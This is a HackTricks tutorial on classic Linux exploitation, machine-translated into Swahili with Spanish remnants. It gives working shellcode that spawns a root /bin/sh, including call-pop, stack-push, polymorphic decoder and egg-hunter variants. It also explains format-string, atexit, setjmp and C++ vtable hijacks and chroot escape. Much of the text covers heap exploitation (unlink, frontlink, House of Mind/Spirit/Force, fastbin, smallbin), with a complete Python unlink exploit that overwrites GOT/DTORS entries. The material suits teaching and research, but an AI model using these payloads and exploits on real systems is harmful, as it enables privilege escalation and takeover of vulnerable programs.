# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

Tazama usumbufu wa kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; tunafuta eax\
xor ebx, ebx ; ebx = 0 kwa sababu hakuna hoja ya kupitisha\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Tekeleza syscall

**nasm -f elf assembly.asm** ‚Äî> Inatuletea .o\
**ld assembly.o -o shellcodeout** ‚Äî> Inatupa executable iliyoundwa na msimbo wa mkusanyiko na tunaweza kupata opcodes kwa **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Ili kuona kwamba kwa kweli ni shellcode yetu na kupata OpCodes

**Kagua kwamba shellcode inafanya kazi**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Ili kuona kwamba wito za mfumo zinafanywa kwa usahihi, inapaswa kukusanywa programu iliyotangulia na wito za mfumo zinapaswa kuonekana katika **strace ./PROGRAMA\_COMPILADO**

Wakati wa kuunda shellcodes, kuna ujanja unaoweza kufanywa. Amri ya kwanza ni jump kwa call. Call inaita msimbo wa asili na pia inaweka EIP kwenye stack. Baada ya amri ya call, tumepachika string ambayo tunahitaji, hivyo kwa EIP hiyo tunaweza kuelekeza kwenye string na pia kuendelea kutekeleza msimbo.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ kutumia Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

Inajumuisha msimbo mdogo unaovinjari kurasa za kumbukumbu zinazohusishwa na mchakato kutafuta shellcode iliyohifadhiwa (inatafuta saini yoyote iliyowekwa kwenye shellcode). Inatumika katika hali ambapo kuna nafasi ndogo tu ya kuingiza msimbo.

**Shellcodes polim√≥rficos**

Inajumuisha shells zilizofichwa ambazo zina msimbo mdogo unaozifichua na kuhamia kwake, ukitumia hila ya Call-Pop hii itakuwa **mfano wa kificho cha cesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5.M√©todos complementarios**

**Teknolojia ya Murat**

Katika linux, programu zote zinapangwa kuanzia 0xbfffffff

Kwa kuangalia jinsi stack ya mchakato mpya inavyoundwa katika linux, inaweza kuendelezwa exploit kwa njia ambayo programu itazinduliwa katika mazingira ambayo variable pekee ni shellcode. Anwani hii basi inaweza kuhesabiwa kama: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Kwa njia hii, anwani ambapo kuna variable ya mazingira na shellcode inaweza kupatikana kwa urahisi.

Hii inaweza kufanywa kwa sababu kazi ya execle inaruhusu kuunda mazingira ambayo yana tu variables za mazingira zinazohitajika.

### **Format Strings to Buffer Overflows**

**sprintf moves** mfuatano wa format **to** **variable.** Hivyo, unaweza kutumia **formatting** ya mfuatano kusababisha **buffer overflow katika variable** ambapo maudhui yanakopiwa.\
Kwa mfano, payload `%.44xAAAA` itandika **44B+"AAAA" katika variable**, ambayo inaweza kusababisha buffer overflow.

### **\_\_atexit Structures**

{% hint style="danger" %}
Siku hizi ni **ajabu sana kutumia hii**.
{% endhint %}

**`atexit()`** ni kazi ambayo **kazi nyingine zinapewa kama vigezo.** Hizi **kazi** zitakuwa **zinatekelezwa** wakati wa kutekeleza **`exit()`** au **kurudi** kwa **main**.\
Ikiwa unaweza **kubadilisha** **anwani** ya yoyote ya hizi **kazi** kuashiria shellcode kwa mfano, utapata **udhibiti** wa **mchakato**, lakini hii kwa sasa ni ngumu zaidi.\
Kwa sasa, **anwani za kazi** zitakazotekelezwa zimefichwa nyuma ya muundo kadhaa na hatimaye anwani ambayo inaashiria si anwani za kazi, bali zime **encrypted na XOR** na displacement na **key ya nasibu**. Hivyo kwa sasa, vector hii ya shambulio si **ya manufaa sana angalau kwenye x86** na **x64\_86**.\
**Kazi ya encryption** ni **`PTR_MANGLE`**. **Mifumo mingine** kama m68k, mips32, mips64, aarch64, arm, hppa... **hazitekelezi kazi ya encryption** kwa sababu inarudisha **kile kile** kama ilivyopokea kama input. Hivyo mifumo hii ingekuwa na uwezo wa kushambuliwa kupitia vector hii.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Siku hizi ni **ajabu sana kutumia hii**.
{% endhint %}

**`Setjmp()`** inaruhusu **kuhifadhi** **muktadha** (registers)\
**`longjmp()`** inaruhusu **kurudisha** **muktadha**.\
**Register zilizohifadhiwa** ni: `EBX, ESI, EDI, ESP, EIP, EBP`\
Kinachotokea ni kwamba EIP na ESP vinapita kupitia **`PTR_MANGLE`** kazi, hivyo **mifumo iliyo hatarini kwa shambulio hili ni ile ile ya hapo juu**.\
Zinatumika kwa ajili ya urejeleaji wa makosa au kuingiliwa.\
Hata hivyo, kutokana na kile nilichosoma, register nyingine hazijalindwa, **hivyo ikiwa kuna `call ebx`, `call esi` au `call edi`** ndani ya kazi inayoitwa, udhibiti unaweza kuchukuliwa. Au unaweza pia kubadilisha EBP ili kubadilisha ESP.

**VTable na VPTR katika C++**

Kila darasa lina **Vtable** ambayo ni array ya **pointers kwa mbinu**.

Kila kitu cha **darasa** kina **VPtr** ambayo ni **pointer** kwa array ya darasa lake. VPtr ni sehemu ya kichwa cha kila kitu, hivyo ikiwa **kuandika** kwa **VPtr** kunafanikiwa inaweza **kubadilishwa** ili **kuashiria** mbinu ya dummy ili kutekeleza kazi kutakuwa na shellcode.

## **Medidas preventivas y evasiones**

**Mabadiliko ya Libsafe**

Inawashwa na: LD\_PRELOAD=/lib/libsafe.so.2\
au\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Inakabili simu za baadhi ya kazi zisizo salama kwa nyingine salama. Haijapangwa. (ni kwa x86 tu, si kwa toleo lililojengwa na -fomit-frame-pointer, si toleo la static, si kazi zote hatarishi zinakuwa salama na LD\_PRELOAD haiwezi kutumika kwenye binaries zenye suid).

**ASCII Armored Address Space**

Inajumuisha kupakia maktaba za pamoja kutoka 0x00000000 hadi 0x00ffffff ili kila wakati kuwe na byte 0x00. Hata hivyo, hii kwa kweli haiwezi kuzuia mashambulizi yoyote, na hasa katika little endian.

**ret2plt**

Inajumuisha kufanya ROP kwa njia ambayo inaita kazi strcpy@plt (kutoka plt) na kuashiria kwenye ingizo la GOT na kunakili byte ya kwanza ya kazi ambayo inataka kuitwa (system()). Kisha inafanywa vivyo hivyo ikielekeza kwenye GOT+1 na kunakili byte ya 2 ya system()‚Ä¶ Mwishowe inaita anwani iliyohifadhiwa katika GOT ambayo itakuwa system().

**Jaula na chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Inasakinisha mfumo wa msingi chini ya subdirectory maalum

Msimamizi anaweza kutoka kwenye moja ya jaula hizi kwa kufanya: mkdir foo; chroot foo; cd ..

**Ufunguo wa msimbo**

Valgrind ‚Äî> Inatafuta makosa\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Kipande kilichotengwa**

prev\_size |\
size | ‚ÄîKichwa\
\*mem | Data

**Kipande kilichohuru**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk ‚ÄîKichwa\
\*mem | Data

Vipande vilivyohuru viko kwenye orodha ya kuunganishwa mara mbili (bin) na haviwezi kuwa na vipande viwili huru pamoja (vinajumuika).

Katika ‚Äúsize‚Äù kuna bits za kuashiria: Ikiwa kipande cha awali kinatumika, ikiwa kipande kimepewa kupitia mmap() na ikiwa kipande kinahusiana na arena ya msingi.

Ikiwa wakati wa kuachilia kipande chochote cha jirani kinapatikana huru, vinajumuika kupitia macro unlink() na kipande kipya kikubwa zaidi kinapelekwa frontlink() ili kiingize bin inayofaa.

unlink(){\
BK = P->bk; ‚Äî> BK ya kipande kipya ni ile ambayo ilikuwa na kipande kilichokuwa huru kabla\
FD = P->fd; ‚Äî> FD ya kipande kipya ni ile ambayo ilikuwa na kipande kilichokuwa huru kabla\
FD->bk = BK; ‚Äî> BK ya kipande kinachofuata inaashiria kipande kipya\
BK->fd = FD; ‚Äî> FD ya kipande cha awali inaashiria kipande kipya\
}

Hivyo basi ikiwa tunafanikiwa kubadilisha P->bk kwa anwani ya shellcode na P->fd kwa anwani ya ingizo katika GOT au DTORS - 12, inafanikiwa:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Na hivyo shellcode inatekelezwa wakati wa kutoka kwenye programu.

Zaidi ya hayo, sentensi ya 4 ya unlink() inaandika kitu na shellcode inapaswa kuwa na marekebisho kwa hili:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Hii inasababisha kuandika bytes 4 kuanzia byte ya 8 ya shellcode, hivyo amri ya kwanza ya shellcode inapaswa kuwa jmp ili kuondoka hapa na kuanguka kwenye nops ambazo zinaelekea kwenye sehemu nyingine ya shellcode.

Hivyo basi exploit inaundwa:

Katika buffer1 tunatia shellcode ikianza na jmp ili kuanguka kwenye nops au kwenye sehemu nyingine ya shellcode.

Baada ya shell code tunatia kujaza hadi kufikia uwanja prev\_size na size ya kipande kinachofuata. Katika maeneo haya tunatia 0xfffffff0 (ili kuandika prev\_size ili iwe na bit inayosema kuwa iko huru) na ‚Äú-4‚Äú(0xfffffffc) katika size (ili wakati itakapokaguliwa katika kipande cha 3 ikiwa kipande cha 2 kilikuwa huru kwa kweli kiende kwenye prev\_size iliyobadilishwa ambayo itamwambia kuwa kiko huru) -> Hivyo wakati free() itakapokagua itakwenda kwenye size ya 3 lakini kwa kweli itakwenda kwenye 2 - 4 na kufikiri kuwa kipande cha 2 kiko huru. Na kisha itaita **unlink()**.

Wakati wa kuita unlink() itatumia kama P->fd data za kwanza za kipande cha 2 hivyo hapo kutakuwa na anwani unayotaka kuandika - 12 (kwa kuwa katika FD->bk itazidisha 12 kwa anwani iliyohifadhiwa katika FD). Na katika anwani hiyo itatia anwani ya pili ambayo itakutana katika kipande cha 2, ambayo tunataka iwe anwani ya shellcode (P->bk bandia).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes za kujaza**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Inahitajika kuwa bit inayosema kuwa kipande cha awali kiko huru iwe 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, ili kufikiri kuwa ‚Äúsize‚Äù ya kipande cha 3 iko nyuma ya bytes 4 (inaashiria prev\_size) kwani hapo ndipo inakagua ikiwa kipande cha 2 kiko huru**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Katika payload mwanzoni tutatia bytes 8 za kujaza**

**got\_free = pack("\<I", 0x08048300 - 12) #Anwani ya free() katika plt-12 (itakuwa anwani itakayokuwa imeandikwa ili shellcode itekelezwe mara ya pili itakapoitwa free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Kama ilivyosemwa payload inaanza na bytes 8 za kujaza kwa sababu tu**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Inabadilisha kipande cha 2, got\_free inaashiria mahali ambapo tutahifadhi anwani addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() kuachilia kwa mwelekeo wa kinyume (wargame)**

Tunadhibiti vipande 3 vya mfululizo na vinachiliwa kwa mpangilio wa kinyume na uliohifadhiwa.

Katika kesi hiyo:

Katika kipande c tunatia shellcode

Kipande a tunakitumia kuandika kipande b kwa njia ambayo size iwe na bit PREV\_INUSE iliyozimwa ili kufikiri kuwa kipande a kiko huru.

Zaidi ya hayo, tunandika katika kichwa b size ili iwe -4.

Hivyo, programu itafikiri kuwa ‚Äúa‚Äù iko huru na katika bin, hivyo itaita unlink() ili kuondoa. Hata hivyo, kama kichwa cha PREV\_SIZE kina thamani -4. Itafikiri kuwa kipande cha ‚Äúa‚Äù kwa kweli kinaanza katika b+4. Hii ni kusema, itafanya unlink() kwa kipande kinachoanza katika b+4, hivyo katika b+12 kutakuwa na pointer ‚Äúfd‚Äù na katika b+16 kutakuwa na pointer ‚Äúbk‚Äù.

Kwa njia hii, ikiwa katika bk tunatia anwani ya shellcode na katika fd tunatia anwani ya kazi ‚Äúputs()‚Äù-12 tuna payload yetu.

**Teknolojia ya Frontlink**

Inaitwa frontlink wakati kitu kinacholewa na hakuna kipande chake jirani ambacho hakiko huru, hakuitwi unlink() bali inaitwa moja kwa moja frontlink().

Uthibitisho wa manufaa wakati malloc inayoshambuliwa kamwe haiachiliwi (free()).

Inahitaji:

Buffer ambayo inaweza kuzidi uwezo wa kuingia data

Buffer inayofuatana na hii ambayo inapaswa kuachiliwa na ambayo itabadilishwa uwanja wa fd wa kichwa chake kwa sababu ya overflow ya buffer ya awali

Buffer ya kuachiliwa yenye ukubwa mkubwa kuliko 512 lakini mdogo kuliko buffer ya awali

Buffer iliyotangulia hatua ya 3 ambayo inaruhusu kuandika prev\_size ya hii

Kwa njia hii, kwa kuandika kwa njia isiyo ya kudhibitiwa katika mallocs mbili na kwa kudhibitiwa katika moja lakini ambayo inachiliwa tu hiyo moja, tunaweza kufanya exploit.

**Uthibitisho wa double free()**

Ikiwa free() inaitwa mara mbili kwa pointer ile ile, kuna bins mbili zinazoashiria anwani ile ile.

Katika kesi ya kutaka kutumia moja itatolewa bila shida. Katika kesi ya kutaka kutumia nyingine, itapewa nafasi ile ile hivyo tutakuwa na pointers ‚Äúfd‚Äù na ‚Äúbk‚Äù zilizopotoshwa na data ambazo zitandikwa na uhifadhi wa awali.

**Baada ya free()**

Pointer iliyokuwa imeachiliwa awali inatumika tena bila udhibiti.

## **8 Heap Overflows: Exploits avanzados**

Mbinu za Unlink() na FrontLink() ziliondolewa kwa kubadilisha kazi ya unlink().

**Nyumba ya akili**

Simu moja ya free() inahitajika ili kusababisha utekelezaji wa msimbo wa kawaida. Inahitajika kutafuta kipande cha pili ambacho kinaweza kuzidiwa na kipande cha awali na kuachiliwa.

Simu moja ya free() inasababisha kuita public\_fREe(mem), hii inafanya:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Inarudisha pointer kwa anwani ambapo kipande kinaanza (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Katika \[1] inakagua uwanja wa size bit NON\_MAIN\_ARENA, ambayo inaweza kubadilishwa ili ukaguzi urudishe kweli na kutekeleze heap\_for\_ptr() ambayo inafanya and kwa ‚Äúmem‚Äù ikiacha 0 bytes 2.5 zisizo muhimu (katika kesi yetu kutoka 0x0804a000 inabaki 0x08000000) na inafikia 0x08000000->ar\_ptr (kama vile ni struct heap\_info)

Kwa njia hii ikiwa tunaweza kudhibiti kipande kwa mfano katika 0x0804a000 na kuna kipande kitakachokuwa kimeachiliwa katika **0x081002a0** tunaweza kufikia anwani 0x08100000 na kuandika chochote tunachotaka, kwa mfano **0x0804a000**. Wakati kipande hiki cha pili kitakapokuwa kimeachiliwa kitakuta kuwa heap\_for\_ptr(ptr)->ar\_ptr inarudisha kile tulichoandika katika 0x08100000 (kwa kuwa inatumika kwa 0x081002a0 and ambayo tuliona hapo awali na kutoka hapo inachukuliwa thamani ya bytes 4 za kwanza, ar\_ptr)

Kwa njia hii inaitwa \_int\_free(ar\_ptr, mem), yaani, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kama tulivyoona hapo awali tunaweza kudhibiti thamani ya av, kwani ni kile tunachokiandika katika kipande kitakachokuwa kimeachiliwa.

Kama inavyofafanuliwa unsorted\_chunks, tunajua kwamba:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Hivyo basi ikiwa katika av->bins\[2] tunatia thamani ya \_\_DTOR\_END\_\_-12 katika amri ya mwisho itandikwa katika \_\_DTOR\_END\_\_ anwani ya kipande cha pili.

Hii ni kusema, katika kipande cha kwanza tunahitaji kuweka mara nyingi anwani ya \_\_DTOR\_END\_\_-12 kwa sababu hapo ndipo itachukuliwa av->bins\[2]

Katika anwani ambayo itakuwa anwani ya kipande cha pili na sifuri tano za mwisho tunahitaji kuandika anwani ya kipande cha kwanza ili heap\_for\_ptr() ifikirie kuwa ar\_ptr iko mwanzo wa kipande cha kwanza na kuchukua kutoka hapo av->bins\[2]

Katika kipande cha pili na kwa msaada wa kipande cha kwanza tunandika prev\_size na jump 0x0c na size na kitu ili kuamsha -> NON\_MAIN\_ARENA

Kisha katika kipande cha 2 tunatia nops nyingi na hatimaye shellcode

Kwa njia hii itaitwa \_int\_free(TROZO1, TROZO2) na itafuata maelekezo ya kuandika katika \_\_DTOR\_END\_\_ anwani ya prev\_size ya TROZO2 ambayo itaruka kwenye shellcode.

Ili kutumia mbinu hii inahitajika kutimizwa baadhi ya mahitaji zaidi ambayo yanakifanya payload kuwa ngumu zaidi.

Mbinu hii haiwezi kutumika tena kwani ilifanywa karibu na patch ile ile kama kwa unlink. Inalinganishwa ikiwa mahali mpya ambapo inashikilia pia inashikilia kwake.

**Fastbin**

Ni toleo la Nyumba ya akili

Tunataka kufikia kutekeleza msimbo ufuatao ambao unafikiwa baada ya ukaguzi wa kwanza wa kazi \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Ikiwa fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Kwa njia hii ikiwa tunatia katika ‚Äúfb‚Äù anwani ya kazi katika GOT, katika anwani hii tutatia anwani ya kipande kilichosababisha. Ili kufanya hivyo itahitajika kuwa arena iko karibu na anwani za dtors. Kwa usahihi av->max\_fast iwe katika anwani ambayo tutakuwa tumeandika.

Kwa sababu na Nyumba ya akili tuliona kwamba sisi tunadhibiti nafasi ya av.

Hivyo basi ikiwa katika uwanja wa size tunatia ukubwa wa 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() itarudisha fastbins\[-1], ambayo itashikilia av->max\_fast

Katika kesi hii av->max\_fast itakuwa anwani ambayo itakuwa imeandikwa (siyo ile ambayo inashikilia, bali hiyo nafasi itakuwa imeandikwa).

Zaidi ya hayo inapaswa kutimizwa kwamba kipande kinachofuata kilichohifadhiwa kinapaswa kuwa kikubwa kuliko 8 -> Kwa sababu tumesema kwamba size ya kipande kilichohifadhiwa ni 8, katika kipande hiki bandia tunahitaji tu kuweka size kubwa kuliko 8 (kama vile shellcode itakuwa katika kipande kilichohifadhiwa, itabidi kuweka mwanzo jump ambayo itanguka kwenye nops).

Zaidi ya hayo, kipande hicho hicho bandia kinapaswa kuwa kidogo kuliko av->system\_mem. av->system\_mem iko 1848 bytes zaidi.

Kwa sababu ya sifuri za \_DTOR\_END\_ na anwani chache katika GOT, hakuna anwani katika sehemu hizi zinazofaa kuandikwa, hivyo tuone jinsi ya kutumia fastbin kushambulia stack.

Njia nyingine ya shambulio ni kuelekeza **av** kwenye stack.

Ikiwa tunabadilisha size ili iwe 16 badala ya 8 basi: fastbin\_index() itarudisha fastbins\[0] na tunaweza kutumia hii kuandika kwenye stack.

Ili kufanya hivyo hakupaswi kuwa na canary au thamani za ajabu kwenye stack, kwa kweli tunapaswa kuwa katika hii: bytes 4 sifuri + EBP + RET

Bytes 4 sifuri zinahitajika ili **av** iwe katika anwani hii na kipengele cha kwanza cha **av** ni mutexe ambayo inapaswa kuwa 0.

**av->max\_fast** itakuwa EBP na itakuwa thamani ambayo itatusaidia kupita vizuizi.

Katika **av->fastbins\[0]** itandikwa na anwani ya **p** na itakuwa RET, hivyo itaruka kwenye shellcode.

Zaidi ya hayo, katika **av->system\_mem** (1484bytes juu ya nafasi kwenye stack) kutakuwa na takataka nyingi ambazo zitaturuhusu kupita ukaguzi unaofanywa.

Zaidi ya hayo inapaswa kutimizwa kwamba kipande kinachofuata kilichohifadhiwa kinapaswa kuwa kikubwa kuliko 8 -> Kwa sababu tumesema kwamba size ya kipande kilichohifadhiwa ni 16, katika kipande hiki bandia tunahitaji tu kuweka size kubwa kuliko 8 (kama vile shellcode itakuwa katika kipande kilichohifadhiwa, itabidi kuweka mwanzo jump ambayo itanguka kwenye nops ambazo ziko baada ya uwanja wa size wa kipande bandia jipya).

**Nyumba ya Roho**

Katika kesi hii tunatafuta kuwa na pointer kwa malloc ambayo inaweza kubadilishwa na mshambuliaji (kwa mfano, kwamba pointer iko kwenye stack chini ya overflow inayoweza kutokea kwa variable).

Hivyo, tunaweza kufanya pointer hii iashirie popote. Hata hivyo, si mahali yoyote ni halali, ukubwa wa kipande bandia lazima uwe mdogo kuliko av->max\_fast na kwa usahihi sawa na ukubwa ulioombwa katika simu ya baadaye kwa malloc()+8. Kwa hivyo, ikiwa tunajua kwamba baada ya pointer hii hatari inaitwa malloc(40), ukubwa wa kipande bandia lazima uwe sawa na 48.

Ikiwa kwa mfano programu inamuuliza mtumiaji nambari tunaweza kuingiza 48 na kuelekeza pointer ya malloc inayoweza kubadilishwa kwa bytes nne zinazofuata (ambazo zinaweza kuwa za EBP kwa bahati, hivyo 48 inabaki nyuma, kana kwamba ni kichwa cha size). Zaidi ya hayo, anwani ptr-4+48 inapaswa kutimiza masharti kadhaa (ikiwa katika kesi hii ptr=EBP), yaani, 8 < ptr-4+48 < av->system\_mem.

Katika kesi hiyo ikiwa hii inatimizwa, wakati simu inayofuata ya malloc ambayo tulisema ilikuwa malloc(40) itapewa kama anwani anwani ya EBP. Ikiwa mshambuliaji pia anaweza kudhibiti kile kinachoandikwa katika malloc hii anaweza kuandika EBP na EIP kwa anwani anayotaka.

Hii nadhani ni kwa sababu wakati itakapokuwa imeachiliwa free() itahifadhi kwamba katika anwani ambayo inaashiria EBP ya stack kuna kipande cha ukubwa mzuri kwa malloc mpya ambayo inataka kuhifadhiwa, hivyo inampa anwani hiyo.

**Nyumba ya Nguvu**

Inahitajika:

* Overflow kwa kipande kinachoruhusu kuandika wilderness
* Simu ya malloc() yenye ukubwa ulioamuliwa na mtumiaji
* Simu ya malloc() ambayo data zake zinaweza kufafanuliwa na mtumiaji

Kitu cha kwanza kinachofanywa ni kuandika size ya kipande wilderness kwa thamani kubwa sana (0xffffffff), hivyo ombi lolote la kumbukumbu kubwa litashughulikiwa katika \_int\_malloc() bila haja ya kupanua heap.

Kitu cha pili ni kubadilisha av->top ili iashirie eneo la kumbukumbu chini ya udhibiti wa mshambuliaji, kama vile stack. Katika av->top itatia \&EIP - 8.

Tunapaswa kuandika av->top ili iashirie eneo la kumbukumbu chini ya udhibiti wa mshambuliaji:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim inachukua thamani ya anwani ya kipande cha wilderness cha sasa (av->top ya sasa) na remainder ni hasa jumla ya anwani hiyo zaidi ya idadi ya bytes zilizohitajika na malloc(). Hivyo ikiwa \&EIP-8 iko katika 0xbffff224 na av->top ina 0x080c2788, basi idadi ambayo tunahitaji kuhifadhi katika malloc inayoweza kudhibitiwa ili av->top iwe inaashiria $EIP-8 kwa malloc inayofuata itakuwa:

0xbffff224 - 0x080c2788 = 3086207644.

Hivyo itahifadhiwa katika av->top thamani iliyobadilishwa na malloc inayofuata itashikilia EIP na inaweza kuandika.

Ni muhimu kujua kwamba size ya kipande kipya cha wilderness iwe kubwa kuliko ombi lililofanywa na malloc ya mwisho. Hii ni kusema, ikiwa wilderness inaashiria \&EIP-8, size itakuwa tu katika uwanja wa EBP wa stack.

**Nyumba ya Hadithi**

**Uharibifu wa SmallBin**

Vipande vilivyohifadhiwa vinatolewa katika bin kulingana na ukubwa wao. Lakini kabla ya kuingizwa vinahifadhiwa katika unsorted bins. Kipande kinapokuwa kimeachiliwa hakijatiwa mara moja katika bin yake bali kinabaki katika unsorted bins. Kisha, ikiwa kipande kipya kinahifadhiwa na kipande cha awali kilichohifadhiwa kinaweza kumfaa kinarejeshwa, lakini ikiwa kinahifadhiwa kikubwa zaidi, kipande kilichohifadhiwa katika unsorted bins kinatiwa katika bin yake inayofaa.

Ili kufikia msimbo hatari ombi la kumbukumbu linapaswa kuwa kubwa kuliko av->max\_fast (72 kwa kawaida) na ndogo kuliko MIN\_LARGE\_SIZE (512).

Ikiwa katika bin kuna kipande cha ukubwa unaofaa kwa kile kinachohitajika kinarejeshwa baada ya kuondolewa:

bck = victim->bk; Inaashiria kipande cha awali, ni taarifa pekee ambayo tunaweza kubadilisha.

bin->bk = bck; Kipande cha pili cha mwisho kinakuwa cha mwisho, ikiwa bck inaashiria stack kipande kinachofuata kinachohifadhiwa kitapewa anwani hii.

bck->fd = bin; Inafunga orodha ikifanya hii iashirie bin.

Inahitaji:

Kuhifadhi malloc mbili, kwa njia ambayo kipande cha kwanza kinaweza kuzidiwa baada ya kipande cha pili kuachiliwa na kuingizwa katika bin yake (yaani, kuhifadhi malloc kubwa zaidi kuliko kipande cha pili kabla ya kufanya overflow).

Kuhifadhi malloc iliyohifadhiwa ambayo inapata anwani iliyochaguliwa na mshambuliaji inapaswa kudhibitiwa na mshambuliaji.

